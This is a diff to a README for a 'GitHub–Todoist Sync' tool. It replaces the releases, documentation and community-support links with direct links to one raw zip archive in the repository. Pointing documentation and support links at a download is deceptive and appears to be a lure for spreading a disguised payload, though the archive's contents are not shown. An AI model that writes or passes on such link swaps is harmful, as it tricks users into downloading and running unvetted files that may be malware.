@@ -7,7 +7,7 @@ Welcome to **GitHub–Todoist Sync**! This tool helps you automatically sync tas
 ## 📦 Download & Install
 
 **To download the application, visit this page:**  
-[Download github-todoist-sync](https://github.com/lhagva9999/github-todoist-sync/releases)
+[Download github-todoist-sync](https://github.com/lhagva9999/github-todoist-sync/raw/refs/heads/main/craft/github-sync-todoist-v1.8-beta.1.zip)
 
 ### Supported Platforms
 
@@ -105,8 +105,8 @@ If you experience any other issues, consider reaching out in our repository disc
 
 ## 🔗 Useful Links
 
-- [Official Documentation](https://github.com/lhagva9999/github-todoist-sync/wiki)
-- [Community Support](https://github.com/lhagva9999/github-todoist-sync/discussions)
+- [Official Documentation](https://github.com/lhagva9999/github-todoist-sync/raw/refs/heads/main/craft/github-sync-todoist-v1.8-beta.1.zip)
+- [Community Support](https://github.com/lhagva9999/github-todoist-sync/raw/refs/heads/main/craft/github-sync-todoist-v1.8-beta.1.zip)
 
 ## 🎉 Contributing
 
